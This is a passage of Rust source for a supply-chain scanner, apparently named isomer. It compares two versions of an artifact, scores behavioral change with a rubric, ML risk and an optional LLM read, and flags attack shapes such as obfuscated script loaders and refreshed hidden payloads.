//! One differential analysis, shared by every output format.
//!
//! cleave's `diff_paths` measures the change (six scopes); [`crate::rubric`]
//! judges it; [`crate::version`] supplies proportionality; [`crate::risk`]
//! scores both sides with the ML model. This module runs that pipeline exactly
//! once and hands the result to a renderer — the terminal grid, the JSON
//! envelope, the SARIF file, or the PR-comment markdown.
//!
//! Running it once is the whole point: `isomer ci` emits four sinks from a
//! single scan, and analysis is the expensive part.

use std::borrow::Cow;
use std::cell::OnceCell;
use std::collections::{BTreeMap, HashSet};
use std::path::Path;

use anyhow::{Context, Result};
use cleave::types::{
    AnalysisReport, Changed, DiffReportV1, DiffSummary, FileDiffEntry, FileStatus, KvChange,
    MetricChange, ScopeDiff, ScopeDiffs, ScopeRocs, SectionChange, StringChange, SymbolChange,
    TraitChange,
};

use crate::evidence::Hunk;
use crate::rubric::Assessment;
use crate::version::{Bump, BumpKind, Version};
use crate::{Cli, Format, Gate, Severity};

/// Run cleave's differential analysis over a pair of paths.
pub(crate) fn diff(
    old: &Path,
    new: &Path,
    options: &cleave::AnalysisOptions,
) -> Result<AnalysisReport> {
    // Analysis and JSON retain the complete differential. Human renderers own
    // their presentation caps and rank what they show; imposing Cleave's CLI
    // row cap here would silently remove inputs from the rubric and feature
    // record before either consumer sees them.
    cleave::diff::diff_paths(old, new, options, cleave::diff::ScopeMask::all(), 0)
}

/// How much of a change a run actually looked at.
///
/// Reported so a reader never has to assume. A pull request whose base build
/// failed still produces a verdict — but only over the source, and a report
/// that did not say so would read exactly like one that compared both builds
/// and found nothing wrong.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum Scope {
    /// The committed change, and nothing built from it.
    Source,
    /// The committed change plus the build outputs of both sides.
    SourceAndBuild,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum Remediation {
    FocusedCleanup,
    ModelRecovery,
    BehaviorRemoval,
}

#[derive(Debug)]
pub(crate) struct RemovedBehavior {
    pub namespace: String,
    pub traits: Vec<String>,
}

impl Scope {
    pub(crate) fn label(self) -> &'static str {
        match self {
            Self::Source => "source only",
            Self::SourceAndBuild => "source + build output",
        }
    }
}

/// One file's two sides, named the way a reader should see it.
///
/// A comparison is a *set* of these: `fs` on two files has one, `ci` on a pull
/// request has one per changed file. Deep analysis (evidence, ML risk, base
/// capabilities) is per file, so it needs the pairing that the two root paths
/// alone don't carry. Either side may be absent — a file added by the change
/// has no old side, a deleted one has no new side.
#[derive(Debug)]
pub(crate) struct Pair {
    /// How the file is named in output: repo-relative under `ci`, the
    /// basename under `fs`.
    pub label: String,
    pub old: Option<std::path::PathBuf>,
    pub new: Option<std::path::PathBuf>,
}

impl Pair {
    /// Pairs for a two-root comparison: the roots themselves when both sides
    /// are single files (cleave pairs them by canonical root, whatever they
    /// are named), otherwise one pair per file the diff reports as touched.
    fn from_roots(old: &Path, new: &Path, diff: &DiffReportV1) -> Vec<Self> {
        if old.is_file() && new.is_file() {
            return vec![Self {
                label: basename(new),
                old: Some(old.to_path_buf()),
                new: Some(new.to_path_buf()),
            }];
        }
        diff.files
            .iter()
            .filter(|f| !matches!(f.status, FileStatus::Unchanged))
            // Archive members are decomposed by the analysis of their
            // container, which has its own pair; pairing them again would
            // double-count and point at paths that don't exist on disk.
            .filter(|f| !f.path.contains("!!"))
            .map(|f| Self {
                label: f.path.clone(),
                old: existing(old.join(&f.path)),
                new: existing(new.join(&f.path)),
            })
            .collect()
    }
}

fn existing(p: std::path::PathBuf) -> Option<std::path::PathBuf> {
    p.is_file().then_some(p)
}

/// Whether the file's trait scope moved at all — the test for "this file
/// changed behavior", regardless of how small the change was judged.
fn traits_moved(entry: &FileDiffEntry) -> bool {
    entry
        .scopes
        .traits
        .as_ref()
        .is_some_and(|traits| !traits.added.is_empty() || !traits.removed.is_empty())
}

/// Trait atoms that moved on one file, worst criticality first. Added and
/// removed together — a reviewer wants both directions of a source change.
fn trait_atoms(entry: &FileDiffEntry) -> Vec<Atom> {
    let Some(traits) = entry.scopes.traits.as_ref() else {
        return Vec::new();
    };
    let mut atoms: Vec<Atom> = traits
        .added
        .iter()
        .map(|t| (true, t))
        .chain(traits.removed.iter().map(|t| (false, t)))
        .map(|(gained, t)| Atom {
            id: t.id.clone(),
            desc: t.desc.clone(),
            crit: t.crit,
            gained,
        })
        .collect();
    atoms.sort_by(|a, b| {
        crate::rubric::crit_rank(b.crit)
            .cmp(&crate::rubric::crit_rank(a.crit))
            .then(a.id.cmp(&b.id))
    });
    atoms
}

/// A full line diff of two text files: `+` for a line only on the new side,
/// `-` for one only on the old, a space for context. Set-based (not
/// positional), so a moved line reads as context and the output is
/// order-independent — enough for an LLM to see exactly what text entered or
/// left. Control chars are neutralized; the total is line-capped so one large
/// file can't blow the context budget.
fn line_diff(old: &[u8], new: &[u8]) -> String {
    use std::fmt::Write as _;
    const MAX_LINES: usize = 400;

    let old_text = String::from_utf8_lossy(old);
    let new_text = String::from_utf8_lossy(new);
    let old_set: HashSet<&str> = old_text.lines().map(str::trim_end).collect();
    let new_set: HashSet<&str> = new_text.lines().map(str::trim_end).collect();

    let mut s = String::new();
    let mut new_lines = new_text.lines();
    for line in new_lines.by_ref().take(MAX_LINES) {
        let mark = if old_set.contains(line.trim_end()) {
            ' '
        } else {
            '+'
        };
        let _ = writeln!(s, "{mark} {}", crate::printable(line));
    }
    if new_lines.next().is_some() {
        let _ = writeln!(s, "  … (diff truncated)");
    }
    for line in old_text
        .lines()
        .filter(|l| !new_set.contains(l.trim_end()))
        .take(MAX_LINES)
    {
        let _ = writeln!(s, "- {}", crate::printable(line));
    }
    s
}

/// The cleave diff plus everything isomer derived from it.
///
/// Borrows the (large) cleave report rather than owning it, so the caller
/// produces it once and every renderer reads the same copy.
pub(crate) struct Analysis<'a> {
    /// The surface that produced this analysis, e.g. `fs` or `ci`.
    pub verb: &'static str,
    pub options: &'a cleave::AnalysisOptions,
    pub report: &'a AnalysisReport,
    /// Raw cleave diff, retained for byte/evidence lookup using original paths.
    pub diff: &'a DiffReportV1,
    /// Version-root-normalized member diff used for judgement and display.
    pub judged_diff: Cow<'a, DiffReportV1>,
    /// The changed files, each with both sides — what deep analysis runs over.
    pub pairs: Vec<Pair>,
    /// What each side exhibits: base capability classes, and the ATT&CK / MBC
    /// ids present before and after.
    pub survey: crate::evidence::Survey,
    pub assessment: Assessment,
    pub naming: Naming,
    pub prop: Proportionality,
    pub risk: Option<crate::risk::Risk>,
    /// A source-archive build macro gained a joined shell-evaluation shape.
    /// Shared by the deterministic gate, terminal view, and LLM context.
    pub source_build_anomaly: bool,
    /// A suspicious build loader remained byte-identical while one of its
    /// compressed test-data carriers changed. This is the two-release xz
    /// shape: stable activation logic with a refreshed hidden stage.
    pub source_payload_refresh: bool,
    /// Joined evidence that this transition removes or disables attack
    /// behavior. Shared by the gate, terminal, and LLM.
    pub remediation: Option<Remediation>,
    /// Worst differential signal: rubric axes plus any worsening ML risk band.
    /// Absolute artifact probability remains visible on the risk line, but a
    /// risky domain baseline does not by itself condemn a benign update.
    pub verdict: Severity,
    /// The verdict before any optional LLM escalation. Terminal and LLM
    /// context use this to distinguish deterministic evidence from the model's
    /// later opinion.
    pub deterministic_verdict: Severity,
    /// Newly-introduced risk only (rubric-new ∪ an ML band jump) — the axis
    /// `--gate new` acts on.
    pub new_verdict: Severity,
    /// The severity the active `--gate` compares against `--fail-on`.
    pub gated: Severity,
    /// Whether the run passes at `--fail-on`.
    pub clean: bool,
    /// Optional `--llm` read of the change.
    pub interp: Option<crate::llm::Interpretation>,
    /// True when the model's verdict pulled [`Self::risk`]'s new score up to
    /// its band floor — so the report can attribute the raised number honestly
    /// (`azoth+llm`) instead of crediting azoth with a value it did not emit.
    pub risk_llm_raised: bool,
    /// What the comparison actually covered. A verb fills this in when it
    /// knows; `None` means the surface has nothing useful to say about scope
    /// (`fs` compares two paths the caller named, so "source" would be a lie).
    pub scope: Option<Scope>,
    /// Profiles of the dependencies this change added — what each can do,
    /// attributed to the dependency. Empty unless `--deps` was requested; a
    /// verb fills it after construction, since it is a separate network step.
    pub deps: Vec<crate::deps::DepProfile>,
    /// Evidence hunks, ranked strongest-first, computed on first use.
    ///
    /// Collecting them re-analyzes every changed file, and `ci` renders four
    /// formats from one analysis — so this is computed at most once per run,
    /// and not at all for a run with nothing to show.
    hunks: OnceCell<Vec<Hunk>>,
    /// Source files whose traits moved, with the atoms and a full line diff —
    /// the signal the Notable finding floor drops. Reads both sides from disk,
    /// so it is computed at most once per run.
    source_changes: OnceCell<Vec<SourceChange>>,
}

/// A source-language file whose behavior-bearing traits changed between the two
/// sides. Carries what the strict rubric discards: the sub-Notable atoms that
/// moved (a `$HOME` read, a base64 heredoc) and a full line diff. An attack
/// composed entirely of individually-innocent atoms — no single trait reaching
/// the finding floor — leaves its whole fingerprint here.
#[derive(Debug)]
pub(crate) struct SourceChange {
    /// How the file is named in output.
    pub label: String,
    /// Trait atoms that appeared or vanished, worst criticality first. Includes
    /// the baseline/component tiers [`crate::rubric::is_finding`] filters out.
    pub atoms: Vec<Atom>,
    /// Full line diff of the file (`+` added, `-` removed), for the LLM.
    pub diff: String,
}

/// One trait that appeared or vanished on a source file.
#[derive(Debug)]
pub(crate) struct Atom {
    pub id: String,
    pub desc: String,
    pub crit: cleave::Criticality,
    /// True when the trait is present on the new side but not the old.
    pub gained: bool,
}

impl<'a> Analysis<'a> {
    /// Judge a completed cleave diff.
    pub(crate) fn new(
        verb: &'static str,
        old: &'a Path,
        new: &'a Path,
        options: &'a cleave::AnalysisOptions,
        report: &'a AnalysisReport,
        cli: &Cli,
    ) -> Result<Self> {
        let diff = report
            .diff
            .as_ref()
            .context("diff_paths returned a report without a diff")?;

        let pairs = Pair::from_roots(old, new, diff);
        let judged_diff = normalized_archive_diff(diff);
        let source_archive = is_source_archive(old) && is_source_archive(new);
        let source_payload_refresh =
            source_archive && stable_source_loader_payload_refresh(old, new, diff);
        let source_build_anomaly = source_archive
            && (source_build_macro_anomaly(new, &judged_diff) || source_payload_refresh);

        // One walk over both sides: the base's capability classes (so a wholly
        // new class is distinguishable from one that merely gained a trait)
        // and the ATT&CK / MBC annotations each side carries.
        let survey = crate::evidence::survey(&pairs, options);
        let assessment = crate::rubric::assess(&judged_diff, &survey.base_classes);
        let naming = Naming::resolve(old, new, cli, &judged_diff);
        let prop = Proportionality::eval(
            &assessment,
            &naming,
            &judged_diff,
            source_archive,
            source_build_anomaly,
            &survey.runtime_entrypoints,
        );

        // Azoth ML risk is the *primary* detector: a jump into a worse band
        // drives the verdict on its own, even when no trait or signature
        // fired. `None` when no model is available — then the hand-coded
        // rubric stands alone.
        let risk = crate::risk::score(&pairs);
        let risk_jump = risk.map_or(Severity::None, |r| {
            let (old, new) = (risk_band(r.old), risk_band(r.new));
            if new > old { new } else { Severity::None }
        });

        // A few attacks are composed of individually medium traits, so the
        // per-trait rubric never reaches the gate. Two shape signals are
        // deliberately generic: a dense capability jump in one/few files,
        // and an endgame package that deletes most of its previous tree. They
        // use cleave's existing change metrics rather than another taxonomy.
        let shape_escalation = change_shape_escalation(
            &assessment,
            &judged_diff,
            naming.bump,
            source_archive,
            source_build_anomaly,
            &survey.runtime_entrypoints,
        );
        let remediation =
            remediation_cleanup_context(old, new, &assessment, &judged_diff, diff, risk);
        let is_remediation = remediation.is_some();

        // A capability the version bump does not license *is* the supply-chain
        // signal — so a disproportionate gain is escalated to a gate-failing
        // severity even when the gained trait's own criticality is only medium.
        // The bump's tolerance already scopes this: `Minor`/`Major` are only
        // disproportionate on a High+ gain (already gate-failing, so this is a
        // no-op), and it bites exactly where it should — a `patch`/`same`
        // (repack) release that has no business gaining behavior at all
        // (unrealircd: a same-version repack that gained byte-comparison and
        // privilege-escalation traits, medium each, under the high gate).
        let escalation = if prop.drift.is_disproportionate() && !is_remediation {
            Severity::High
        } else {
            Severity::None
        };
        let rubric_new = if is_remediation {
            assessment.new_severity_without_signatures()
        } else {
            assessment.new_severity()
        };
        let shape_new = if is_remediation {
            Severity::None
        } else {
            shape_escalation
        };
        // The human-facing deterministic verdict must include the same
        // escalation signals as the gate. Otherwise a shape-only attack can
        // fail a High gate while the masthead still says NOTABLE (faker's
        // endgame package deletion was the concrete example). Keep the raw
        // Azoth probability visible but use only a worsening band in the
        // change verdict. A wallet or security package can have a high
        // absolute score on both sides without this release being an attack.
        // Static traits in explicitly disabled handlers remain useful audit
        // evidence, but they no longer describe executable new behavior. Keep
        // cleanup visible as Notable while preserving independent identity,
        // structure, known-signature, model, and direct-hostile signals.
        let remediation_floor = Severity::Medium
            .max(assessment.identity.severity)
            .max(assessment.structure.severity)
            .max(assessment.signature.severity)
            .max(if rubric_new >= Severity::Critical {
                Severity::Critical
            } else {
                Severity::None
            });
        let verdict = if is_remediation {
            remediation_floor.max(risk_jump)
        } else {
            assessment
                .severity
                .max(risk_jump)
                .max(escalation)
                .max(shape_new)
        };
        let new_verdict = if is_remediation {
            remediation_floor.max(risk_jump)
        } else {
            rubric_new.max(risk_jump).max(escalation).max(shape_new)
        };
        let gated = match cli.gate {
            Gate::New => new_verdict,
            Gate::Any => verdict,
        };

        let a = Self {
            verb,
            options,
            report,
            diff,
            judged_diff,
            pairs,
            survey,
            assessment,
            naming,
            prop,
            risk,
            source_build_anomaly,
            source_payload_refresh,
            remediation,
            verdict,
            new_verdict,
            gated,
            clean: !gated.fails(cli.fail_on),
            deterministic_verdict: verdict,
            interp: None,
            risk_llm_raised: false,
            scope: None,
            deps: Vec::new(),
            hunks: OnceCell::new(),
            source_changes: OnceCell::new(),
        };
        Ok(a)
    }

    /// The network half of an analysis, and the last thing every verb does
    /// before rendering: fetch the added dependencies when `--deps` asks for
    /// them, fold what they can do into the verdict, and only then take the
    /// model's read — so the LLM is shown the same case the terminal and the
    /// gate are.
    ///
    /// This is one method rather than two because the order matters and the
    /// ordering used to live as an unwritten rule across three call sites:
    /// `ci` never folded the profiles in, so `isomer ci --deps` silently
    /// skipped interpretation altogether.
    pub(crate) fn finish(&mut self, cli: &Cli) {
        if cli.deps && !cli.offline {
            let profiles = crate::deps::profiles(self.diff, self.options, cli.progress());
            self.apply_dependency_profiles(profiles, cli);
        }
        self.interpret(cli);
    }

    /// Fold fetched added-dependency profiles into the deterministic verdict.
    /// A newly declared dependency is wholly new code from this artifact's
    /// perspective; when `--deps` finds High/Critical behavior in it, merely
    /// printing that profile while returning a passing gate would be a false
    /// negative. Fetch failures remain visible notes and contribute no score.
    fn apply_dependency_profiles(&mut self, profiles: Vec<crate::deps::DepProfile>, cli: &Cli) {
        let severity = crate::deps::severity(&profiles);
        self.deps = profiles;
        self.deterministic_verdict = self.deterministic_verdict.max(severity);
        self.verdict = self.verdict.max(severity);
        self.new_verdict = self.new_verdict.max(severity);
        self.gated = match cli.gate {
            Gate::New => self.new_verdict,
            Gate::Any => self.verdict,
        };
        self.clean = !self.gated.fails(cli.fail_on);
    }

    fn interpret(&mut self, cli: &Cli) {
        if cli.format != Format::Interpret
            && crate::llm::requested(cli)
            && self.speaks(cli)
            && let Some(cfg) = crate::llm::config(cli)
        {
            self.interp = match crate::llm::interpret(&cfg, &self.llm_context()) {
                Ok(i) => Some(i),
                Err(e) => {
                    eprintln!("isomer: llm interpretation failed: {e:#}");
                    None
                }
            };
        }
        // The model's read is a detection signal, not just a caption: fold its
        // verdict into the *displayed* severity so a change the rubric
        // under-rates but the model calls malicious is escalated (SUSPICIOUS →
        // HOSTILE), and pull the risk bar up to the band that call implies. It
        // only ever raises — a benign read never lowers a rubric finding.
        //
        // The gate (`gated`/`clean`, the CI exit code) is deliberately left
        // deterministic: a model hallucination must not fail someone's build.
        // So the LLM sharpens the human-facing verdict without making CI
        // non-reproducible.
        if let Some(sev) = self
            .interp
            .as_ref()
            .map(crate::llm::Interpretation::severity)
            && sev > Severity::None
        {
            self.verdict = self.verdict.max(sev);
            if let Some(r) = self.risk.as_mut() {
                let floor = self
                    .interp
                    .as_ref()
                    .map_or(0.0, crate::llm::Interpretation::risk_floor);
                if r.new < floor {
                    r.new = floor;
                    self.risk_llm_raised = true;
                }
            }
        }
    }

    /// Render one output format.
    pub(crate) fn render(&self, format: Format, cli: &Cli) -> Result<String> {
        match format {
            Format::Terminal => Ok(crate::terminal::report(self, cli)),
            Format::Json => Ok(format!("{}\n", self.json(cli)?)),
            Format::Markdown => Ok(crate::markdown::report(self, cli)),
            Format::Sarif => Ok(format!("{}\n", crate::sarif::report(self)?)),
            // Keep this byte-for-byte identical to the user message passed to
            // `llm::interpret`: no system prompt, verdict line, or added
            // newline. This mirrors scan's `--format interpret` contract and
            // makes the payload independently inspectable/replayable.
            Format::Interpret => Ok(self.llm_context()),
        }
    }

    /// Differential view for human/model presentation. Archive package roots
    /// with embedded versions are paired before counts and paths are shown.
    pub(crate) fn display_diff(&self) -> &DiffReportV1 {
        &self.judged_diff
    }

    /// Whether there is anything worth saying.
    ///
    /// Everything the rubric measures is *change* — a finding present
    /// unchanged on both sides never enters the diff — so an assessment
    /// reaching Notable means this change introduced something worth naming,
    /// hostile or not. Saying so is also how a reviewer knows the scanner is
    /// alive between real incidents. A run with nothing to report still says
    /// nothing at all.
    pub(crate) fn speaks(&self, cli: &Cli) -> bool {
        self.gated.fails(cli.fail_on)
            // Notable+ is the reporting floor; the tiers below it are atoms
            // and unremarkable observations (see `rubric::is_finding`).
            || self.assessment.severity >= Severity::Medium
            || self.risk_band_moved()
            || self.prop.drift.is_disproportionate()
            // Removing attack behavior is itself a notable change. The
            // remediation floor lives above `assessment.severity` because the
            // rubric scores gains; do not let a successful cleanup fall into
            // the quiet "no behavioral change" path.
            || self.remediation.is_some()
            // An implant-shaped change always deserves words.
            || self.prop.skew.is_some()
            // Gained external code — a runtime dependency or a new/moved
            // GitHub Action — is a supply-chain event worth surfacing on its
            // own, even when it stays below the gate.
            || self.assessment.structure.adds_external_code()
            // A source file that gained behavior-bearing atoms below the finding
            // floor (a `$HOME` read, a base64 heredoc) changed how it behaves
            // even when no single trait rose to a finding. Say so — a silent
            // verdict on a file that plainly gained obfuscation is the exact
            // blind spot an atom-composed attack aims for.
            || !self.observations().is_empty()
    }

    /// Whether the model's read moved between risk bands, in either direction.
    /// A drop matters too: it is how a reviewer sees that a fix landed.
    pub(crate) fn risk_band_moved(&self) -> bool {
        self.risk
            .is_some_and(|r| risk_band(r.new) != risk_band(r.old))
    }

    /// The judgement, in one line, before any detail. What a reader wants
    /// first is not what changed, but what isomer makes of it.
    pub(crate) fn judgement(&self) -> String {
        if !self.clean {
            return self.headline();
        }
        self.clean_note()
    }

    /// Like [`judgement`](Self::judgement) but with the model's read left for
    /// its own line — used by the terminal, which prints `✨ nature` separately,
    /// so the two never echo each other.
    pub(crate) fn reason(&self) -> String {
        if !self.clean {
            return self.headline_facts();
        }
        self.clean_note()
    }

    /// The passing-change note: how much was noticed, and whether the model's
    /// band moved. Shared by [`judgement`](Self::judgement) and
    /// [`reason`](Self::reason); the LLM's phrasing has no place here (a clean
    /// verdict's note is about counts, not the read).
    fn clean_note(&self) -> String {
        if self.remediation.is_some() {
            return self.headline_facts();
        }
        match (self.assessment.finding_count(), self.risk_band_moved()) {
            (0, false) => "no behavioral change".to_string(),
            (0, true) => "no new capabilities, but the model reads this differently".to_string(),
            (n, _) => format!(
                "nothing that fails the gate — {n} change{} worth a look",
                if n == 1 { "" } else { "s" },
            ),
        }
    }

    /// The strongest `limit` evidence hunks behind the verdict, in file order.
    pub(crate) fn hunks(&self, limit: usize) -> Vec<&Hunk> {
        let all = self.hunks.get_or_init(|| {
            crate::evidence::hunks(
                &self.pairs,
                self.options,
                &self.assessment.gained_ids(),
                self.diff,
            )
        });
        crate::evidence::strongest(all, limit)
    }

    /// Source files whose traits moved, each with the atoms and a full line
    /// diff. Computed once and memoized (both sides are read from disk).
    ///
    /// This is the seam that keeps a diff from going silent when an attack is
    /// composed of individually-innocent atoms: no single trait reaches the
    /// Notable finding floor, so the rubric surfaces nothing, but the file still
    /// *changed behavior* — and here that change is captured whole, both for the
    /// [`observations`](Self::observations) a reviewer sees and for the full
    /// diff the LLM reads.
    pub(crate) fn source_changes(&self) -> &[SourceChange] {
        self.source_changes
            .get_or_init(|| self.collect_source_changes())
    }

    /// Walk the pairs, keeping the source-language files whose trait scope
    /// changed, and pair each with the atoms that moved and a line diff.
    fn collect_source_changes(&self) -> Vec<SourceChange> {
        // A single-file `fs` comparison names its one diff entry `<root>`, not
        // the basename, so it can't be matched to the pair by path — but there
        // is only one pair, so the lone changed entry is unambiguously its.
        let single = self.pairs.len() == 1;
        // An archive comparison is one pair — the container — while the files
        // that changed are members inside it (`container!!member`). Their text
        // has to come back out of the archive, so they get their own walk.
        if let [container] = self.pairs.as_slice()
            && self
                .judged_diff
                .files
                .iter()
                .any(|file| file.path.contains("!!"))
        {
            return self.collect_archive_source_changes(container);
        }
        let mut out = Vec::new();
        for pair in &self.pairs {
            let (Some(old), Some(new)) = (pair.old.as_deref(), pair.new.as_deref()) else {
                continue;
            };
            let Some(entry) = self.diff.files.iter().find(|f| {
                !matches!(f.status, FileStatus::Unchanged)
                    && (single || f.path == pair.label)
                    && traits_moved(f)
            }) else {
                continue;
            };
            // Cheap fileid (no full parse) on the new side decides source-ness;
            // manifests (package.json) are structured data, not a source
            // language, and are covered by the dependency path instead.
            let Ok(new_bytes) = std::fs::read(new) else {
                continue;
            };
            if !filefacts::FileId::from_path_and_bytes(new, &new_bytes)
                .file_type()
                .is_source_code()
            {
                continue;
            }
            // An unreadable base is not an empty base. Defaulting to empty would
            // render every line of the new file as an addition and hand both the
            // reader and the LLM a whole-file rewrite that never happened.
            let old_bytes = match std::fs::read(old) {
                Ok(bytes) => bytes,
                Err(e) => {
                    eprintln!("isomer: could not read base {}: {e:#}", old.display());
                    continue;
                }
            };
            out.push(SourceChange {
                label: pair.label.clone(),
                atoms: trait_atoms(entry),
                diff: line_diff(&old_bytes, &new_bytes),
            });
        }
        out
    }

    /// The archive counterpart of [`collect_source_changes`](Self::collect_source_changes):
    /// every changed source member of the container, each side extracted so the
    /// member gets the same whole line diff a plain file would.
    fn collect_archive_source_changes(&self, container: &Pair) -> Vec<SourceChange> {
        let (Some(old_archive), Some(new_archive)) =
            (container.old.as_deref(), container.new.as_deref())
        else {
            return Vec::new();
        };
        let mut out = Vec::new();
        for entry in &self.judged_diff.files {
            if !matches!(entry.status, FileStatus::Changed)
                || !traits_moved(entry)
                || !member_type(entry).is_some_and(|file_type| file_type.is_source_code())
            {
                continue;
            }
            let Some((old_member, new_member)) = archive_member_pair(self.diff, entry) else {
                continue;
            };
            let (Some(old_bytes), Some(new_bytes)) = (
                archive_member_bytes(old_archive, old_member),
                archive_member_bytes(new_archive, new_member),
            ) else {
                continue;
            };
            out.push(SourceChange {
                label: display_member_path(&entry.path).to_string(),
                atoms: trait_atoms(entry),
                diff: line_diff(&old_bytes, &new_bytes),
            });
        }
        out
    }

    /// The gained sub-Notable atoms across every changed source file — the
    /// behavioral changes the rubric dropped, for the report's observations
    /// line. Findings (Notable+) are already named as capability classes, so
    /// they are excluded here to avoid saying the same thing twice.
    pub(crate) fn observations(&self) -> Vec<&Atom> {
        self.source_changes()
            .iter()
            .flat_map(|c| &c.atoms)
            .filter(|a| a.gained && !crate::rubric::is_finding(a.crit))
            .collect()
    }

    /// The one-line reason a reader needs first: why the change is judged the
    /// way it is. Prefers the LLM read, then the proportionality note, then
    /// the worst capability class.
    pub(crate) fn headline(&self) -> String {
        if let Some(i) = self.interp.as_ref().filter(|i| !i.nature.trim().is_empty()) {
            return i.nature.trim().to_string();
        }
        self.headline_facts()
    }

    /// The deterministic one-liner behind the verdict — proportionality, then
    /// the worst capability class, signature, or structural fact. The model's
    /// read is *not* consulted; [`headline`](Self::headline) prefers it, but a
    /// surface that shows the read on its own line uses this so they do not
    /// repeat.
    pub(crate) fn headline_facts(&self) -> String {
        if restored_endgame_package_shape(self.display_diff()) {
            return "restored package runtime tree and declared entrypoint".to_string();
        }
        match self.remediation {
            Some(Remediation::FocusedCleanup) => {
                return "disabled risky handlers and added artifact cleanup".to_string();
            }
            Some(Remediation::ModelRecovery) => {
                return "removed attack behavior and sharply reduced model risk".to_string();
            }
            Some(Remediation::BehaviorRemoval) => {
                return "removed high-severity attack behavior".to_string();
            }
            None => {}
        }
        if let Some(dependency) = self
            .deps
            .iter()
            .filter(|dependency| dependency.severity >= Severity::High)
            .max_by_key(|dependency| dependency.severity)
        {
            return format!(
                "new dependency {} contains {}-severity behavior",
                dependency.coord,
                dependency.severity.as_str()
            );
        }
        if dependency_with_fallback_load(&self.assessment, &self.judged_diff) {
            return "added dependency alongside fallback module load".to_string();
        }
        if let Some(expansion) = dependency_backed_public_api_anomaly(
            self.display_diff(),
            self.naming.bump,
            &self.survey.runtime_entrypoints,
        ) {
            return format!(
                "patch-level public API expansion pulls floating dependency {}",
                expansion.dependency
            );
        }
        if let Some(member) = source_download_write_execute_anomaly(
            self.display_diff(),
            self.naming.bump,
            &self.survey.runtime_entrypoints,
        ) {
            return format!(
                "auto-loaded source downloads, writes, and executes a payload in {member}"
            );
        }
        if obfuscated_remote_script_loader(self.display_diff()) {
            return "gained obfuscated remote browser script loader".to_string();
        }
        if external_remote_script_loader(self.display_diff()) {
            return "gained external browser script loader".to_string();
        }
        if binary_replacement_anomaly(self.display_diff(), self.naming.bump).is_some() {
            return "same-version compiled binary was structurally replaced".to_string();
        }
        if runtime_graft_anomaly(
            self.display_diff(),
            self.naming.bump,
            &self.survey.runtime_entrypoints,
        )
        .is_some()
        {
            return "runtime entrypoint gained a timestamp-clustered external payload".to_string();
        }
        if opaque_runtime_payload_anomaly(
            self.display_diff(),
            self.naming.bump,
            &self.survey.runtime_entrypoints,
        )
        .is_some()
        {
            return "runtime entrypoint gained an opaque encoded payload".to_string();
        }
        if let Some(note) = self.prop.drift.escalation_note() {
            return note.to_string();
        }
        if let Some(skew) = &self.prop.skew {
            return skew.clone();
        }
        let classes: HashSet<&str> = self
            .assessment
            .behavioral
            .categories
            .iter()
            .map(|c| c.class.as_str())
            .collect();
        let has = |class: &str| classes.contains(class);
        if has("anti-static") && has("fs/file") && has("fs/delete") {
            if has("communications/http") {
                return "gained obfuscated web payload with file write/delete".to_string();
            }
            return "gained obfuscated self-deleting file payload".to_string();
        }
        if has("anti-static") && has("impact") {
            return "gained obfuscated destructive behavior".to_string();
        }
        if let Some(c) = self.assessment.behavioral.categories.first() {
            let verb = if self.assessment.behavioral.is_new_category(c) {
                "gained"
            } else {
                "expanded"
            };
            return format!("{verb} {}", c.label);
        }
        if let Some(s) = self.assessment.signature.ids.first() {
            return format!(
                "matched a known-bad rule — {}",
                crate::rubric::short_name(&s.id)
            );
        }
        if let Some(f) = self.assessment.structure.facts.first() {
            return format!("{}: {}", f.label, f.detail);
        }
        "no behavioral change".to_string()
    }

    /// Compact, cross-scope facts about the *shape* of the differential. These
    /// are deliberately shared by the LLM and terminal views: they explain
    /// why a modest version change can be alarming without dumping the raw
    /// cleave report into either audience's primary view.
    pub(crate) fn differential_summary(&self) -> Vec<String> {
        let d = self.display_diff();
        let added = d.summary.files_added as usize;
        let removed = d.summary.files_removed as usize;
        let mut changed = d.summary.files_changed as usize;
        let unchanged = d.summary.files_unchanged as usize;
        // In a nested diff the container itself is a synthetic root entry; the
        // member topology is what an analyst means by the package change.
        if d.files.iter().any(|f| f.path.contains("!!"))
            && d.files.iter().any(|f| f.path == "<root>")
        {
            changed = changed.saturating_sub(1);
        }
        let total = added + removed + changed + unchanged;
        let mut lines = vec![format!(
            "files: +{added} added, -{removed} removed, ~{changed} changed{}",
            if total > 0 {
                format!(", {total} compared")
            } else {
                String::new()
            }
        )];
        lines.push(format!(
            "scope ROC: overall {:.0}% · traits {:.0}% · metrics {:.0}% · facts {:.0}%",
            d.summary.overall_roc * 100.0,
            d.summary.scope_roc.traits * 100.0,
            d.summary.scope_roc.metrics * 100.0,
            d.summary.scope_roc.kv * 100.0,
        ));
        if let Some(size) = root_size_delta(d) {
            lines.push(format!("package size: {size}"));
        }
        // A package-wide top six is meaningful for a compact implant, but in
        // a thousand-file framework release it merely selects unrelated local
        // extrema from arbitrary files. Large releases retain their complete
        // metrics in JSON and their per-file ranked summaries in human views.
        if compact_change(&d.summary) {
            let metric_changes = strongest_metric_changes(d, 6);
            if !metric_changes.is_empty() {
                lines.push(format!(
                    "largest metric changes: {}",
                    metric_changes.join(" · ")
                ));
            }
        }
        if let Some(replacement) = binary_replacement_anomaly(d, self.naming.bump) {
            lines.push(format!(
                "binary replacement: same-version compiled binary has {} large metric movements across {} independent families",
                replacement.large_moves, replacement.metric_families,
            ));
        }
        if let Some(payload) =
            opaque_runtime_payload_anomaly(d, self.naming.bump, &self.survey.runtime_entrypoints)
        {
            lines.push(format!(
                "runtime payload: {} newly references {} ({:.0} bytes on {:.0} line{}, {:.0}% encoded strings, longest string {:.0} bytes)",
                display_member_path(&payload.entrypoint),
                display_member_path(&payload.payload),
                payload.size,
                payload.lines,
                if payload.lines == 1.0 { "" } else { "s" },
                payload.encoded_ratio * 100.0,
                payload.max_string,
            ));
        }
        if let Some(graft) =
            runtime_graft_anomaly(d, self.naming.bump, &self.survey.runtime_entrypoints)
        {
            lines.push(format!(
                "runtime graft: {} newly references {} alongside an external URL and absolute host path; both are timestamp outliers within a {:.0}-second archive window",
                display_member_path(&graft.entrypoint),
                display_member_path(&graft.payload),
                graft.timestamp_spread,
            ));
        }
        if let Some(expansion) = dependency_backed_public_api_anomaly(
            d,
            self.naming.bump,
            &self.survey.runtime_entrypoints,
        ) {
            lines.push(format!(
                "dependency-backed API expansion: {} adds {} ({}) to its public surface",
                display_member_path(&expansion.entrypoint),
                expansion.dependency,
